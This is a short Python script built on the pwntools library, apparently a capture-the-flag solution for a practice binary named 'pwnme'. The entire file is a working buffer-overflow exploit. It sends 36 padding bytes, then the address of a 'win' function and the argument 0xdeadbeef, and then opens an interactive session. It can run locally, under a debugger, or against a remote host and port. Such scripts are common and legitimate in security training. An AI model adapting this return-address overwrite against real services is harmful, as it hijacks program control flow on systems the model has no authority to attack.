#!/usr/bin/env python3
from pwn import *


exe = './pwnme'

elf = context.binary = ELF('pwnme')
context.terminal = ['alacritty', '-e', 'zsh', '-c']

#context.log_level= 'DEBUG'



def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#### Exploit starts here ####

io = start()

OFFSET = 36
payload = OFFSET * b'A'
payload += p32(elf.symbols['win'])
payload += b"\x00" * 4
payload += p32(0xdeadbeef)

io.sendline(payload)

io.interactive()